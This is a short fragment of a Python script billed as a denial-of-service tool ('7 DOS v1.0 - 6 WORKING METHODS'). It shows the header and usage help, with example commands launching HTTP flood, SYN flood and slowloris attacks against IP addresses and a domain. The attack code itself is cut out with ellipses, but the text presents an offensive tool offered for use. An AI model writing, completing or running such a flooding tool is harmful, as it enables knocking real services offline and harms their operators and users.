#!/usr/bin/env python3
"""
7 DOS v1.0 - 6 WORKING METHODS
Usage: python3 7.py <target> <method> <threads> [port]
...
def main():
    if len(sys.argv) < 4:
        print(f"""
{B}7 DOS v1.0 - 6 WORKING METHODS{W}

{Y}Usage:{W} python3 7.py <target> <method> <threads> [port]
...
{Y}Examples:{W}
  python3 7.py 192.168.1.1 http 200
  sudo python3 7.py 10.0.0.1 syn 100
  python3 7.py example.com slowloris 50 8080
        """)
        return
